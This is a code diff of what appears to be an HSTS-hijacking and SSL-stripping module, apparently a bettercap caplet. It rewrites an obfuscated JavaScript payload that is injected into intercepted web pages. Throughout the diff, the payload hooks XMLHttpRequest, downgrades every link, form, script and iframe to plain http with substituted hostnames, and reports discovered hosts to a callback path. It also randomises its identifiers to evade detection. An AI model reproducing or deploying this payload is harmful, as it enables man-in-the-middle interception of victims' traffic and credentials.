@@ -6,107 +6,118 @@ var ssl_log = [],
 
 var payload,
     payload_container = new String(
-    	"if (!{{session_id}}) {\n" + 
-    		"var {{session_id}} = function() {\n" + 
-    			"{{variables}}\n" + 
-				"var obf_var_callback_log = [];" + 
-				"function obf_func_toWholeRegexp(obf_var_string) {" + 
-					"obf_var_string = obf_var_string.replace(/\\./g, \"\\\\.\")" + 
-					"obf_var_string = obf_var_string.replace(/\\-/g, \"\\\\-\")" + 
-					"return new RegExp(\"^\" + obf_var_string + \"$\", \"ig\")" + 
-				"}" + 
-				"function obf_func_toWholeWildcardRegexp(obf_var_string) {" + 
-					"obf_var_string = obf_var_string.replace(/\\-/g, \"\\\\-\")" + 
-					"obf_var_string = obf_var_string.replace(\"*.\", \"((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)\")" + 
-					"obf_var_string = obf_var_string.replace(/\\./g, \"\\\\.\")" + 
-					"return new RegExp(\"^\" + obf_var_string + \"$\", \"ig\")" + 
-				"}" + 
-				"function obf_func_hstshijack(obf_host) {" + 
-					"for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {" + 
-						"var obf_var_regexp;" + 
-						"if (obf_var_target_hosts[obf_var_i].match(/^\\*/)) {" + 
-							"obf_var_regexp = obf_func_toWholeWildcardRegexp(obf_var_target_hosts[obf_var_i]);" + 
-						"} else {" + 
-							"obf_var_regexp = obf_func_toWholeRegexp(obf_var_target_hosts[obf_var_i]);" + 
-						"}" + 
-						"if (obf_host.match(obf_var_regexp)) {" + 
-							"var obf_var_replacement;" + 
-							"if (obf_var_target_hosts[obf_var_i].match(/^\\*/)) {" + 
-								"obf_var_replacement = \"$1\" + obf_var_replacement_hosts[obf_var_i].replace(/^\\*\\./, \"\");" + 
-							"} else {" + 
-								"obf_var_replacement = obf_var_replacement_hosts[obf_var_i];" + 
-							"}" + 
-							"obf_host = obf_host.replace(obf_var_regexp, obf_var_replacement);" + 
-							"return obf_host;" + 
-						"}" + 
-					"}" + 
-					"return obf_host;" + 
-				"}" + 
-				"function obf_func_attack_XMLHttpRequest() {" + 
-					"var obf_func_open = XMLHttpRequest.prototype.open;" + 
-					"XMLHttpRequest.prototype.open = function(obf_var_method, obf_var_url, obf_var_async, obf_var_username, obf_var_password) {" + 
-						"for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {" + 
-							"obf_var_host = obf_func_hstshijack(obf_var_url.replace(/^http[s]?:\\/\\/([^:/?#]+).*$/i, \"$1\"));" + 
-							"obf_var_path = obf_var_url.replace(/^(?:http[s]?:\\/\\/[^:/?#]*)?([:/?#].*$)/, \"$1\");" + 
-							"obf_var_url = \"http://\" + obf_var_host + obf_var_path;" + 
-						"}" + 
-						"return obf_func_open.apply(this, arguments);" + 
-					"}" + 
-				"}" + 
-				"function obf_func_callback(obf_var_data) {" + 
-					"obf_var_req = new XMLHttpRequest();" + 
-					"obf_var_req.open(\"GET\", \"http://\" + location.host + \"/obf_path_ssl_log?\" + obf_var_data, true);" + 
-					"obf_var_req.send();" + 
-				"}" + 
-				"function obf_func_attack() {" + 
-					"try {" + 
-						"obf_var_regexp = new RegExp(\"http[s]?:\\\\/\\\\/((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\\\.)+(?:[a-z]{1,63}))\", \"ig\");" + 
-						"obf_var_urls = document.body.innerHTML.match(obf_var_regexp);" + 
-						"for (var obf_var_i = 0; obf_var_i < obf_var_urls.length; obf_var_i++) {" + 
-							"obf_var_host = obf_var_urls[obf_var_i].replace(obf_var_regexp, \"$1\");" + 
-							"if (obf_var_callback_log.indexOf(obf_var_host) == -1) {" + 
-								"obf_func_callback(btoa(obf_var_host));" + 
-								"obf_var_callback_log.push(obf_var_host);" + 
-							"}" + 
-						"}" + 
-					"} catch(obf_ignore){}" + 
-					"try {" + 
-						"document.querySelectorAll(\"a,form,script,iframe\").forEach(function(obf_var_node){" + 
-							"obf_var_url = \"\";" + 
-							"switch (obf_var_node.tagName) {" + 
-								"case \"A\": obf_var_node.href ? obf_var_url = obf_var_node.href : \"\"; break;" + 
-								"case \"FORM\": obf_var_node.action ? obf_var_url = obf_var_node.action : \"\"; break;" + 
-								"case \"SCRIPT\": obf_var_node.src ? obf_var_url = obf_var_node.src : \"\"; break;" + 
-								"case \"IFRAME\": obf_var_node.src ? obf_var_url = obf_var_node.src : \"\"; break;" + 
-							"}" + 
-							"if (obf_var_url.match(/^http[s]?:\\/\\/[^/?#]+(?:[/?#].*$)?/i)) {" + 
-								"obf_var_path = obf_var_url.replace(/^http[s]?:\\/\\/[^:/?#]+([:/?#].*$)?/i, \"$1\");" + 
-								"obf_var_host = obf_func_hstshijack(obf_var_url.replace(/^http[s]?:\\/\\/([^:/?#]+).*/i, \"$1\"));" + 
-								"switch (obf_var_node.tagName) {" + 
-									"case \"A\": obf_var_node.href ? obf_var_node.href = \"http://\" + obf_var_host + obf_var_path : \"\"; break;" + 
-									"case \"FORM\": obf_var_node.action ? obf_var_node.action = \"http://\" + obf_var_host + obf_var_path : \"\"; break;" + 
-									"case \"SCRIPT\": obf_var_node.src ? obf_var_node.src = \"http://\" + obf_var_host + obf_var_path : \"\"; break;" + 
-									"case \"IFRAME\": obf_var_node.src ? obf_var_node.src = \"http://\" + obf_var_host + obf_var_path : \"\"; break;" + 
-								"}" + 
-							"}" + 
-						"});" + 
-					"} catch(obf_ignore){}" + 
-				"}" + 
-				"setInterval(function(){" + 
-					"obf_func_attack();" + 
-					"obf_func_attack_XMLHttpRequest();" + 
-				"}, 666);" + 
-				"try {" + 
-					"document.addEventListener(\"DOMContentLoaded\", obf_func_attack);" + 
-					"document.addEventListener(\"DOMContentLoaded\", obf_func_attack_XMLHttpRequest);" + 
-				"} catch(obf_ignore){" + 
-					"self.addEventListener(\"load\", obf_func_attack);" + 
-					"self.addEventListener(\"load\", obf_func_attack_XMLHttpRequest);" + 
-				"}" + 
-				"obf_func_attack();" + 
-				"{{custom_payload}}\n" + 
-    		"}\n" + 
-    		"{{session_id}}();\n" + 
+    	"if (!self.{{session_id}}) {\n" + 
+    	"	self.{{session_id}} = function() {\n" + 
+    	"		var obf_var_callback_log_121737 = [];\n" + 
+    	"		function obf_func_toWholeRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737) {\n" + 
+    	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\")\n" + 
+    	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\-/g, \"\\\\-\")\n" + 
+    	"			return [\n" + 
+    	"				new RegExp(\"^\" + obf_var_selector_string_121737 + \"$\", \"ig\"),\n" + 
+    	"				obf_var_replacement_string_121737\n" + 
+    	"			]\n" + 
+    	"		}\n" + 
+    	"		function obf_func_toWholeWildcardRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737) {\n" + 
+    	"			obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\-/g, \"\\\\-\")\n" + 
+    	"			if ( obf_var_selector_string_121737.match(/^\\*./) ) {\n" + 
+    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/^\\*\\./, \"((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)\")\n" + 
+    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\")\n" + 
+    	"				obf_var_replacement_string_121737 = obf_var_replacement_string_121737.replace(/^\\*\\./, \"\")\n" + 
+    	"				return [\n" + 
+    	"					new RegExp(\"^\" + obf_var_selector_string_121737 + \"$\", \"ig\"),\n" + 
+    	"					\"$1\" + obf_var_replacement_string_121737\n" + 
+    	"				]\n" + 
+    	"			} else if ( obf_var_selector_string_121737.match(/\\.\\*$/) ) {\n" + 
+    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\.\\*/g, \"((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)\")\n" + 
+    	"				obf_var_selector_string_121737 = obf_var_selector_string_121737.replace(/\\./g, \"\\\\.\")\n" + 
+    	"				obf_var_replacement_string_121737 = obf_var_replacement_string_121737.replace(/\\.\\*$/, \"\")\n" + 
+    	"				return [\n" + 
+    	"					new RegExp(obf_var_selector_string_121737, \"ig\"),\n" + 
+    	"					obf_var_replacement_string_121737 + \"$1\"\n" + 
+    	"				]\n" + 
+    	"			}\n" + 
+    	"		}\n" + 
+    	"		function obf_func_toWholeRegexpSet_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737) {\n" + 
+    	"			if ( obf_var_selector_string_121737.indexOf(\"*\") != -1 ) {\n" + 
+    	"				return obf_func_toWholeWildcardRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737)			\n" + 
+    	"			} else {\n" + 
+    	"				return obf_func_toWholeRegexp_121737(obf_var_selector_string_121737, obf_var_replacement_string_121737)\n" + 
+    	"			}\n" + 
+    	"		}\n" + 
+    	"		{{variables}}\n" + 
+    	"		function obf_func_hstshijack_121737(obf_host_121737) {\n" + 
+    	"			for (obf_var_i_121737 = 0; obf_var_i_121737 < obf_var_target_hosts.length; obf_var_i_121737++) {\n" + 
+    	"				obf_var_whole_regexp_set_121737 = obf_func_toWholeRegexpSet_121737(obf_var_target_hosts[obf_var_i_121737], obf_var_replacement_hosts[obf_var_i_121737]);\n" + 
+    	"				if (obf_host_121737.match(obf_var_whole_regexp_set_121737[0])) {\n" + 
+    	"					obf_host_121737 = obf_host_121737.replace(obf_var_whole_regexp_set_121737[0], obf_var_whole_regexp_set_121737[1]);\n" + 
+    	"					break;\n" + 
+    	"				}\n" + 
+    	"			}\n" + 
+    	"			return obf_host_121737;\n" + 
+    	"		}\n" + 
+    	"		function obf_func_attack_XMLHttpRequest_121737() {\n" + 
+    	"			var obf_func_open_121737 = XMLHttpRequest.prototype.open;\n" + 
+    	"			XMLHttpRequest.prototype.open = function(obf_var_method_121737, obf_var_url_121737, obf_var_async_121737, obf_var_username_121737, obf_var_password_121737) {\n" + 
+    	"				obf_var_host_121737 = obf_func_hstshijack_121737(obf_var_url_121737.replace(/^http[s]?:\\/\\/([^:/?#]+).*$/i, \"$1\"));\n" + 
+    	"				obf_var_path_121737 = obf_var_url_121737.replace(/^(?:http[s]?:\\/\\/[^:/?#]*)?([:/?#].*$)/, \"$1\");\n" + 
+    	"				obf_var_url_121737 = \"http://\" + obf_var_host_121737 + obf_var_path_121737;\n" + 
+    	"				return obf_func_open_121737.apply(this, arguments);\n" + 
+    	"			}\n" + 
+    	"		}\n" + 
+    	"		function obf_func_callback_121737(obf_var_data_121737) {\n" + 
+    	"			obf_var_req_121737 = new XMLHttpRequest();\n" + 
+    	"			obf_var_req_121737.open(\"GET\", \"http://\" + location.host + \"/obf_path_ssl_log?\" + obf_var_data_121737, true);\n" + 
+    	"			obf_var_req_121737.send();\n" + 
+    	"		}\n" + 
+    	"		function obf_func_attack_121737() {\n" + 
+    	"			try {\n" + 
+    	"				obf_var_regexp_121737 = new RegExp(\"http[s]?:\\\\/\\\\/((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\\\.)+(?:[a-z]{1,63}))\", \"ig\");\n" + 
+    	"				obf_var_urls_121737 = document.body.innerHTML.match(obf_var_regexp_121737);\n" + 
+    	"				for (var obf_var_i_121737 = 0; obf_var_i_121737 < obf_var_urls_121737.length; obf_var_i_121737++) {\n" + 
+    	"					obf_var_host_121737 = obf_var_urls_121737[obf_var_i_121737].replace(obf_var_regexp_121737, \"\");\n" + 
+    	"					if (obf_var_callback_log_121737.indexOf(obf_var_host_121737) == -1) {\n" + 
+    	"						obf_func_callback_121737(btoa(obf_var_host_121737));\n" + 
+    	"						obf_var_callback_log_121737.push(obf_var_host_121737);\n" + 
+    	"					}\n" + 
+    	"				}\n" + 
+    	"			} catch(obf_ignore_121737){}\n" + 
+    	"			try {\n" + 
+    	"				document.querySelectorAll(\"a,form,script,iframe\").forEach(function(obf_var_node_121737){\n" + 
+    	"					obf_var_url_121737 = \"\";\n" + 
+    	"					switch (obf_var_node_121737.tagName) {\n" + 
+    	"						case \"A\": obf_var_node_121737.href ? obf_var_url_121737 = obf_var_node_121737.href : \"\"; break;\n" + 
+    	"						case \"FORM\": obf_var_node_121737.action ? obf_var_url_121737 = obf_var_node_121737.action : \"\"; break;\n" + 
+    	"						case \"SCRIPT\": obf_var_node_121737.src ? obf_var_url_121737 = obf_var_node_121737.src : \"\"; break;\n" + 
+    	"						case \"IFRAME\": obf_var_node_121737.src ? obf_var_url_121737 = obf_var_node_121737.src : \"\"; break;\n" + 
+    	"					}\n" + 
+    	"					if (obf_var_url_121737.match(/^http[s]?:\\/\\/(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\\.)+[a-z]{1,63}(?:[:/?#].*$)?/i)) {\n" + 
+    	"						obf_var_path_121737 = obf_var_url_121737.replace(/^http[s]?:\\/\\/[^:/?#]+([:/?#].*$)?/i, \"$1\");\n" + 
+    	"						obf_var_host_121737 = obf_func_hstshijack_121737(obf_var_url_121737.replace(/^http[s]?:\\/\\/([^:/?#]+).*/i, \"$1\"));\n" + 
+    	"						switch (obf_var_node_121737.tagName) {\n" + 
+    	"							case \"A\": obf_var_node_121737.href ? obf_var_node_121737.href = \"http://\" + obf_var_host_121737 + obf_var_path_121737 : \"\"; break;\n" + 
+    	"							case \"FORM\": obf_var_node_121737.action ? obf_var_node_121737.action = \"http://\" + obf_var_host_121737 + obf_var_path_121737 : \"\"; break;\n" + 
+    	"							case \"SCRIPT\": obf_var_node_121737.src ? obf_var_node_121737.src = \"http://\" + obf_var_host_121737 + obf_var_path_121737 : \"\"; break;\n" + 
+    	"							case \"IFRAME\": obf_var_node_121737.src ? obf_var_node_121737.src = \"http://\" + obf_var_host_121737 + obf_var_path_121737 : \"\"; break;\n" + 
+    	"						}\n" + 
+    	"					}\n" + 
+    	"				});\n" + 
+    	"			} catch(obf_ignore_121737){}\n" + 
+    	"		}\n" + 
+    	"		setInterval(function(){\n" + 
+    	"			obf_func_attack_121737();\n" + 
+    	"			obf_func_attack_XMLHttpRequest_121737();\n" + 
+    	"		}, 666);\n" + 
+    	"		try {\n" + 
+    	"			document.addEventListener(\"DOMContentLoaded\", obf_func_attack_121737);\n" + 
+    	"			document.addEventListener(\"DOMContentLoaded\", obf_func_attack_XMLHttpRequest_121737);\n" + 
+    	"		} catch(obf_ignore_121737){\n" + 
+    	"			self.addEventListener(\"load\", obf_func_attack_121737);\n" + 
+    	"			self.addEventListener(\"load\", obf_func_attack_XMLHttpRequest_121737);\n" + 
+    	"		}\n" + 
+    	"		obf_func_attack_121737();\n" + 
+    	"		{{custom_payload}}\n" + 
+    	"	}\n" + 
+    	"	self.{{session_id}}();\n" + 
     	"}\n")
 
 var ignore_hosts       = [],
@@ -233,7 +244,7 @@ function configure() {
 			custom_payload = readFile(path).replace(/obf_path_whitelist/g, whitelist_path).replace(/obf_path_callback/g, callback_path)
 
 			if (obfuscate) {
-				obfuscation_variables = custom_payload.match(/obf_[a-z\_]*/ig) || []
+				obfuscation_variables = custom_payload.match(/obf_[a-z0-9\_]*/ig) || []
 				for (var b = 0; b < obfuscation_variables.length; b++) {
 					regexp = new RegExp(obfuscation_variables[b], "g")
 					custom_payload = custom_payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
@@ -262,7 +273,7 @@ function configure() {
 	payload = payload.replace(/obf_var_target_hosts/g, var_target_hosts)
 	// Obfuscate core payload.
 	if (obfuscate) {
-		obfuscation_variables = payload.match(/obf_[a-z\_]*/ig) || []
+		obfuscation_variables = payload.match(/obf_[a-z0-9_]*/ig) || []
 		for (var i = 0; i < obfuscation_variables.length; i++) {
 			regexp = new RegExp(obfuscation_variables[i], "g")
 			payload = payload.replace( regexp, randomString( 8 + Math.random() * 16 ) )
